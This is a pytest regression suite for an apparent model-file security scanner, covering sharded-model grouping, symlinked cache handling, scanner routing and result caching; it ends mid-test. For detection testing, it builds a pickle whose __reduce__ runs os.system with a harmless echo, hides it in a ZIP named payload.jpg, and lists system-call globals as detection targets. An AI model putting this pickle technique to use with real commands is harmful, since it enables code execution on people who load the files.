"""Core dispatch regressions for content-routed model formats."""

from __future__ import annotations

import base64
import gzip
import json
import pickle
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from modelaudit import core as core_module
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.cache.optimized_config import normalize_material_scan_config
from modelaudit.core import scan_file, scan_model_directory_or_file
from modelaudit.scanners import flax_msgpack_scanner, jinja2_template_scanner
from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
from modelaudit.utils.file.detection import JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES
from modelaudit.utils.helpers.secure_hasher import compute_aggregate_hash
from tests.helpers import create_mock_gguf, create_mock_onnx, create_mock_pytorch_zip

_SYSTEM_GLOBAL_NAMES = ("os.system", "posix.system", "nt.system")


def _build_malicious_pickle() -> bytes:
    """Build a tiny pickle payload that exercises nested dangerous-opcode scanning."""
    import os as os_module

    class DangerousPayload:
        """Serializable payload that reduces to a shell command invocation."""

        def __reduce__(self) -> tuple[Any, tuple[str]]:
            """Return a dangerous reducer target for scanner regression coverage."""
            return (os_module.system, ("echo core-dispatch-test",))

    return pickle.dumps(DangerousPayload())


def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
    """Write a ZIP archive at an intentionally misleading file path."""
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in entries.items():
            archive.writestr(name, data)


def _create_zip_with_ordered_entries(path: Path, entries: list[tuple[str, bytes]]) -> None:
    """Write a ZIP archive with duplicate entries in caller-defined order."""
    with zipfile.ZipFile(path, "w") as archive:
        for name, data in entries:
            archive.writestr(name, data)


def _prepend_stub(path: Path, stub: bytes) -> None:
    """Prefix an existing ZIP with reader-tolerated self-extracting stub bytes."""
    path.write_bytes(stub + path.read_bytes())


def _mark_zip_entries_encrypted(path: Path) -> None:
    """Set the ZIP encryption flag on all entries without changing payload bytes."""
    archive_bytes = bytearray(path.read_bytes())
    for signature, flag_offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        offset = 0
        while True:
            offset = archive_bytes.find(signature, offset)
            if offset < 0:
                break
            flags = int.from_bytes(archive_bytes[offset + flag_offset : offset + flag_offset + 2], "little")
            archive_bytes[offset + flag_offset : offset + flag_offset + 2] = (flags | 0x1).to_bytes(2, "little")
            offset += len(signature)
    path.write_bytes(archive_bytes)


def _assert_system_pickle_detected(result: ScanResult, entry_name: str) -> None:
    """Assert a nested pickle finding points at the expected ZIP entry."""
    assert any(
        issue.rule_code == "S201"
        and issue.details.get("zip_entry") == entry_name
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected S201 finding for {entry_name}, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def _mock_sharded_scan_result(bytes_scanned: int, *, missing_shards: int = 0) -> ScanResult:
    """Return a ScanResult shaped like the advanced sharded-model handler."""
    result = ScanResult(scanner_name="safetensors")
    result.bytes_scanned = bytes_scanned
    result.add_check(
        name="Mock Shard Scan",
        passed=True,
        message="Mock shard family scanned",
        severity=IssueSeverity.INFO,
    )
    if missing_shards:
        result.add_check(
            name="Sharded Model Coverage Check",
            passed=False,
            message=f"Missing {missing_shards} expected model shard(s); scan coverage is incomplete.",
            severity=IssueSeverity.INFO,
            details={
                "expected_total_shards": 3,
                "present_total_shards": 2,
                "missing_shard_count": missing_shards,
                "analysis_incomplete": True,
                "scan_outcome": "inconclusive",
                "scan_outcome_reason": "missing_model_shards",
            },
        )
        result.metadata["analysis_incomplete"] = True
        result.metadata["scan_outcome"] = "inconclusive"
        result.metadata["scan_outcome_reasons"] = ["missing_model_shards"]
    result.finish(success=missing_shards == 0)
    return result


def test_directory_scan_scans_sharded_model_family_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 4):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(family_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert len(calls) == 1
    assert Path(calls[0]).name in {shard.name for shard in shards}
    assert result.files_scanned == len(shards)
    assert result.bytes_scanned == family_size
    assert set(result.file_metadata) == {str(shard) for shard in shards}
    assert {asset.path for asset in result.assets} == {str(shard) for shard in shards}


def test_directory_scan_preserves_per_shard_sizes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index, payload in enumerate((b"a", b"second-shard", b"third-shard-is-longer"), start=1):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(payload)
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        result = _mock_sharded_scan_result(family_size)
        result.metadata["file_size"] = family_size
        return result

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    expected_sizes = {str(shard): shard.stat().st_size for shard in shards}
    assert {path: metadata.file_size for path, metadata in result.file_metadata.items()} == expected_sizes
    assert {asset.path: asset.size for asset in result.assets} == expected_sizes


def test_directory_scan_rejects_shard_siblings_outside_scan_root(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    first_shard = model_dir / "model-00001-of-00002.safetensors"
    first_shard.write_bytes(b"inside-shard")
    outside_shard = outside_dir / "model-00002-of-00002.safetensors"
    outside_shard.write_bytes(b"outside-shard")
    (model_dir / outside_shard.name).symlink_to(outside_shard)
    calls: list[str] = []
    captured_configs: list[dict[str, Any]] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(first_shard.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(model_dir), cache_scan_results=False)
    outside_path = str(outside_shard.resolve())

    assert len(calls) == 1
    assert outside_path not in result.file_metadata
    assert outside_path not in {asset.path for asset in result.assets}
    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert outside_path not in {member["path"] for member in fingerprint["members"]}
    assert any(
        issue.message == "Path traversal outside scanned directory"
        and issue.location == outside_path
        and issue.details["resolved_path"] == outside_path
        for issue in result.issues
    )


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_groups_hf_cache_sharded_symlinks(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshots_dir = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshots_dir.mkdir(parents=True)
    blobs_dir.mkdir()

    blob_paths: list[Path] = []
    shard_links: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"hf-shard-{shard_index}".encode())
        shard_link = snapshots_dir / f"model-{shard_index:05d}-of-00002.safetensors"
        shard_link.symlink_to(Path("../../blobs") / blob_path.name)
        blob_paths.append(blob_path.resolve())
        shard_links.append(shard_link)

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshots_dir), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert Path(calls[0]).name in {shard_link.name for shard_link in shard_links}
    assert result.files_scanned == len(shard_links)
    assert set(result.file_metadata) == {str(shard_link) for shard_link in shard_links}
    assert {asset.path for asset in result.assets} == {str(shard_link) for shard_link in shard_links}
    assert {member["path"] for member in fingerprint["members"]} == {str(blob_path) for blob_path in blob_paths}
    assert not any("path traversal" in issue.message.lower() for issue in result.issues)


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_keeps_nonsharded_hf_snapshot_aliases_deduplicated(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_path = blobs_dir / "shared-blob"
    blob_path.write_bytes(b"shared-model")

    for revision in ("abc123", "def456"):
        snapshots_dir = cache_dir / "snapshots" / revision
        snapshots_dir.mkdir(parents=True)
        (snapshots_dir / "model.safetensors").symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(blob_path.stat().st_size)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    assert calls == [str(blob_path.resolve())]
    assert result.files_scanned == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_deduplicates_identical_hf_shard_families_across_snapshots(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        for revision in ("abc123", "def456"):
            snapshots_dir = cache_dir / "snapshots" / revision
            snapshots_dir.mkdir(parents=True, exist_ok=True)
            (snapshots_dir / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(
                Path("../../blobs") / blob_path.name
            )

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert result.files_scanned == len(blob_paths)
    assert result.bytes_scanned == sum(blob_path.stat().st_size for blob_path in blob_paths)
    assert {member["path"] for member in fingerprint["members"]} == {str(blob_path) for blob_path in blob_paths}


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_reports_incomplete_hf_snapshot_after_shared_blob_dedupe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        full_snapshot = cache_dir / "snapshots" / "abc123"
        full_snapshot.mkdir(parents=True, exist_ok=True)
        (full_snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(
            Path("../../blobs") / blob_path.name
        )

    partial_snapshot = cache_dir / "snapshots" / "def456"
    partial_snapshot.mkdir(parents=True)
    (partial_snapshot / "model-00001-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_paths[0].name)

    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        material_config = normalize_material_scan_config(captured_configs[-1])
        fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
        member_paths = [Path(member["path"]) for member in fingerprint["members"]]
        return _mock_sharded_scan_result(
            sum(member_path.stat().st_size for member_path in member_paths),
            missing_shards=1 if len(member_paths) == 1 else 0,
        )

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    material_configs = [normalize_material_scan_config(config) for config in captured_configs]
    fingerprints = [config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY] for config in material_configs]
    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 2
    assert sorted(len(fingerprint["members"]) for fingerprint in fingerprints) == [1, 2]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["missing_shard_count"] == 1


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_keeps_distinct_hf_shard_filename_patterns(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    blobs_dir = cache_dir / "blobs"
    blobs_dir.mkdir(parents=True)
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}"
        blob_path.write_bytes(f"shared-hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        for revision, filename in (
            ("abc123", f"model-{shard_index:05d}-of-00002.safetensors"),
            ("def456", f"pytorch_model-{shard_index:05d}-of-00002.bin"),
        ):
            snapshot = cache_dir / "snapshots" / revision
            snapshot.mkdir(parents=True, exist_ok=True)
            (snapshot / filename).symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir / "snapshots"), cache_scan_results=False)

    assert len(calls) == 2
    assert {Path(call).suffix for call in calls} == {".bin", ".safetensors"}
    assert result.files_scanned == 4


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_deduplicates_hf_shard_aliases_against_raw_blobs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_paths: list[Path] = []
    for shard_index in range(1, 3):
        blob_path = blobs_dir / f"blob-{shard_index}.safetensors"
        blob_path.write_bytes(f"hf-shard-{shard_index}".encode())
        blob_paths.append(blob_path.resolve())
        (snapshot / f"model-{shard_index:05d}-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(sum(blob_path.stat().st_size for blob_path in blob_paths))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(cache_dir), cache_scan_results=False)

    assert len(calls) == 1
    assert Path(calls[0]).parent == snapshot
    assert result.files_scanned == 2


@pytest.mark.usefixtures("requires_symlinks")
def test_directory_scan_handles_broken_hf_shard_alias_per_file(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hf_home = tmp_path / "hf-home"
    monkeypatch.setenv("HF_HOME", str(hf_home))
    cache_dir = hf_home / "hub" / "models--org--model"
    snapshot = cache_dir / "snapshots" / "abc123"
    blobs_dir = cache_dir / "blobs"
    snapshot.mkdir(parents=True)
    blobs_dir.mkdir()
    blob_path = blobs_dir / "blob-1"
    blob_path.write_bytes(b"hf-shard-1")
    (snapshot / "model-00001-of-00002.safetensors").symlink_to(Path("../../blobs") / blob_path.name)
    missing_blob = blobs_dir / "missing-blob"
    (snapshot / "model-00002-of-00002.safetensors").symlink_to(Path("../../blobs") / missing_blob.name)

    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        if Path(path) == missing_blob:
            result = ScanResult(scanner_name="error")
            result.add_check(
                name="File Size Check",
                passed=False,
                message="Error checking file size: missing blob",
                severity=IssueSeverity.INFO,
            )
            result.finish(success=False)
            return result
        return _mock_sharded_scan_result(blob_path.stat().st_size, missing_shards=1)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(snapshot), cache_scan_results=False)

    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 2
    assert str(missing_blob) in calls
    assert len(coverage_checks) == 1
    assert any(check.name == "File Size Check" for check in result.checks)


def test_scan_file_passes_shard_allowlist_to_advanced_handler(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shard = tmp_path / "model-00001-of-00002.safetensors"
    shard.write_bytes(b"inside-shard")
    allowed_path = str(shard.resolve())
    captured_allowed_paths: list[list[str] | None] = []

    class DummyScanner:
        name = "dummy"

        def __init__(self, config: dict[str, Any] | None = None) -> None:
            self.config = config or {}

    def fake_select_preferred_scanner_id(path: str, header_format: str, ext: str) -> str | None:
        assert path == str(shard)
        assert isinstance(header_format, str)
        assert ext == ".safetensors"
        return None

    def fake_get_scanner_for_path(path: str, **kwargs: Any) -> type[DummyScanner]:
        assert path == str(shard)
        assert kwargs == {"scanner_selection": None}
        return DummyScanner

    def fake_scan_advanced_large_file(
        path: str,
        scanner: DummyScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
    ) -> ScanResult:
        assert path == str(shard)
        assert progress_callback is None
        assert timeout == 7200
        captured_allowed_paths.append(allowed_shard_paths)
        result = ScanResult(scanner_name=scanner.name)
        result.bytes_scanned = shard.stat().st_size
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "should_use_advanced_handler", lambda path: path == str(shard))
    monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", fake_get_scanner_for_path)
    monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)

    result = scan_file(
        str(shard),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {"path": allowed_path, "content_hash": "sha256:inside"},
                    {"path": 123, "content_hash": "invalid"},
                    "not-a-member",
                ],
            },
        },
    )

    assert result.scanner_name == "dummy"
    assert captured_allowed_paths == [[allowed_path]]


def test_scan_file_passes_shard_allowlist_to_preferred_advanced_handler(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shard = tmp_path / "model-00001-of-00002.safetensors"
    shard.write_bytes(b"inside-shard")
    allowed_path = str(shard.resolve())
    captured_allowed_paths: list[list[str] | None] = []

    class DummyPreferredScanner:
        name = "dummy_preferred"

        def __init__(self, config: dict[str, Any] | None = None) -> None:
            self.config = config or {}

        @staticmethod
        def can_handle(path: str) -> bool:
            return path == str(shard)

    def fake_select_preferred_scanner_id(path: str, header_format: str, ext: str) -> str | None:
        assert path == str(shard)
        assert isinstance(header_format, str)
        assert ext == ".safetensors"
        return "dummy_preferred"

    def fake_scan_advanced_large_file(
        path: str,
        scanner: DummyPreferredScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
    ) -> ScanResult:
        assert path == str(shard)
        assert scanner.name == "dummy_preferred"
        assert progress_callback is None
        assert timeout == 7200
        captured_allowed_paths.append(allowed_shard_paths)
        result = ScanResult(scanner_name=scanner.name)
        result.bytes_scanned = shard.stat().st_size
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "should_use_advanced_handler", lambda path: path == str(shard))
    monkeypatch.setattr(core_module, "_select_preferred_scanner_id", fake_select_preferred_scanner_id)
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda scanner_id: DummyPreferredScanner)
    monkeypatch.setattr(
        core_module._registry,
        "get_scanner_for_path",
        lambda *args, **kwargs: pytest.fail("preferred scanner path should not use registry fallback"),
    )
    monkeypatch.setattr(core_module, "scan_advanced_large_file", fake_scan_advanced_large_file)

    result = scan_file(
        str(shard),
        config={
            "cache_scan_results": False,
            core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY: {
                "members": [
                    {"path": allowed_path, "content_hash": "sha256:inside"},
                    {"path": None, "content_hash": "invalid"},
                    "not-a-member",
                ],
            },
        },
    )

    assert result.scanner_name == "dummy_preferred"
    assert captured_allowed_paths == [[allowed_path]]


def test_directory_scan_reports_incomplete_sharded_model_family_once(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00003.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    family_size = sum(shard.stat().st_size for shard in shards)
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        return _mock_sharded_scan_result(family_size, missing_shards=1)

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    coverage_checks = [check for check in result.checks if check.name == "Sharded Model Coverage Check"]
    assert len(calls) == 1
    assert result.files_scanned == len(shards)
    assert result.bytes_scanned == family_size
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["missing_shard_count"] == 1


def test_directory_scan_sharded_family_cache_fingerprint_tracks_sibling_shards(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"model-{shard_index:05d}-of-00002.safetensors"
        shard_path.write_bytes(f"shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    captured_configs: list[dict[str, Any]] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(shard.stat().st_size for shard in shards))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    core_module.scan_model_directory_or_file(str(tmp_path))
    first_material_config = normalize_material_scan_config(captured_configs[0])
    first_fingerprint = first_material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]

    shards[1].write_bytes(b"changed-shard-2")
    captured_configs.clear()

    core_module.scan_model_directory_or_file(str(tmp_path))
    second_material_config = normalize_material_scan_config(captured_configs[0])
    second_fingerprint = second_material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]

    assert {member["path"] for member in first_fingerprint["members"]} == {str(shard) for shard in shards}
    assert first_fingerprint != second_fingerprint


def test_directory_scan_groups_shard_family_without_declared_total(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    shards: list[Path] = []
    for shard_index in range(1, 3):
        shard_path = tmp_path / f"checkpoint_{shard_index}.pt"
        shard_path.write_bytes(f"checkpoint-shard-{shard_index}".encode())
        shards.append(shard_path.resolve())
    captured_configs: list[dict[str, Any]] = []
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        captured_configs.append(dict(config or {}))
        return _mock_sharded_scan_result(sum(shard.stat().st_size for shard in shards))

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    material_config = normalize_material_scan_config(captured_configs[0])
    fingerprint = material_config[core_module._SHARD_FAMILY_CACHE_FINGERPRINT_CONFIG_KEY]
    assert len(calls) == 1
    assert Path(calls[0]).name in {shard.name for shard in shards}
    assert result.files_scanned == len(shards)
    assert fingerprint["expected_total_shards"] is None
    assert {member["path"] for member in fingerprint["members"]} == {str(shard) for shard in shards}


def test_directory_scan_content_hash_excludes_files_skipped_by_total_size_limit(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_files: list[Path] = []
    for index in range(3):
        model_path = tmp_path / f"model-{index}.safetensors"
        model_path.write_bytes(f"model-{index}".encode())
        model_files.append(model_path.resolve())
    calls: list[str] = []

    def fake_scan_file(path: str, config: dict[str, Any] | None = None) -> ScanResult:
        calls.append(path)
        result = ScanResult(scanner_name="safetensors")
        result.bytes_scanned = 2
        result.finish(success=True)
        return result

    monkeypatch.setattr(core_module, "scan_file", fake_scan_file)

    result = core_module.scan_model_directory_or_file(str(tmp_path), max_total_size=1)

    all_file_hashes = [core_module._calculate_file_hash(str(model_path)) for model_path in model_files]
    scanned_file_hashes = [core_module._calculate_file_hash(path) for path in calls]
    assert len(calls) == 1
    assert result.content_hash == compute_aggregate_hash(scanned_file_hashes)
    assert result.content_hash != compute_aggregate_hash(all_file_hashes)


def test_scan_file_detects_malicious_zip_with_misleading_extension(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


@pytest.mark.parametrize("suffix", [".flax", ".orbax", ".jax"])
def test_scan_file_fails_closed_for_msgpack_extensions_when_dependency_is_missing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    suffix: str,
) -> None:
    checkpoint = tmp_path / f"model{suffix}"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    result = scan_file(str(checkpoint))

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    library_check = next(check for check in result.checks if check.name == "msgpack Library Check")
    assert library_check.message == "msgpack library not installed - cannot analyze Flax checkpoints"

    aggregate = scan_model_directory_or_file(str(checkpoint), cache_scan_results=False)
    assert aggregate.success is True
    assert core_module.determine_exit_code(aggregate) == 1


def test_scan_file_does_not_route_msgpack_suffix_near_match_without_dependency(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    checkpoint = tmp_path / "model.flaxy"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is True


def test_scan_file_routes_malicious_explicit_flax_suffix_to_flax_scanner(tmp_path: Path) -> None:
    if not flax_msgpack_scanner.HAS_MSGPACK:
        pytest.skip("msgpack unavailable")

    checkpoint = tmp_path / "malicious.flax"
    checkpoint.write_bytes(
        flax_msgpack_scanner.msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True)
    )

    result = scan_file(str(checkpoint), config={"cache_scan_results": False})

    assert result.scanner_name == "flax_msgpack"
    assert result.success is False
    assert any(issue.message == "Suspicious object attribute detected: __reduce__" for issue in result.issues)


def test_scan_file_missing_msgpack_result_is_not_cached(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    checkpoint = tmp_path / "model.flax"
    checkpoint.write_bytes(b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    monkeypatch.setattr(flax_msgpack_scanner, "HAS_MSGPACK", False)

    reset_cache_manager()
    try:
        first = scan_file(str(checkpoint), config=config)
        second = scan_file(str(checkpoint), config=config)

        assert first.success is False
        assert second.success is False
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_missing_yaml_parser_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "model"
    model_dir.mkdir()
    yaml_file = model_dir / "config.yaml"
    yaml_file.write_text("model: safe\n", encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    monkeypatch.setattr(jinja2_template_scanner, "HAS_YAML", False)

    reset_cache_manager()
    try:
        first = scan_file(str(yaml_file), config=config)
        second = scan_file(str(yaml_file), config=config)

